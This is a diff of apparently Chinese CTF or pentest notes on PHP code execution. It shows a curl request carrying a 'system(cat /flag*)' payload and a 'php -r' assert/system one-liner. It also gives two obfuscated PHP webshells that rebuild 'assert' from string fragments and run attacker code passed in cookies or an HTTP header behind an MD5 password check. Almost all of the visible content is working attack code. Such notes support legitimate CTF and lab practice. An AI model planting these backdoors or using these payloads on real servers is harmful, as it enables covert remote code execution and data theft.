@@ -77,6 +77,10 @@ curl "http://172.16.2.234:8011/4.php" -d "1=system('cat /flag*')"
 de9d4919ce86aeb38a5332c7d1c4d24a
 ```
 
+```
+php -r "assert(system('ls -al'));"
+```
+
 -----------------
 #### PHP代码执行函数总结
 
@@ -309,12 +313,12 @@ a17ef5f51631bba2b7098bdeee4d729566668888
 #### grep 带有特俗字符的文件   sed -i替换
 
 
-md5马
+md5马:
 ```
 //v5est0r
 <?php $a="a"."s"."se"."rt";if (md5($_COOKIE[2])==="10972d718c21fdc8718efbaa8e67740e"){$a($_COOKIE[1]);}?>
 ```
-header传参的马
+header传参的马:
 ```
 <?php $a="a"."s"."se"."rt";if (md5($_SERVER['HTTP_X'])==="10972d718c21fdc8718efbaa8e67740e"){$a($_SERVER['HTTP_Y']);}?>
 ```
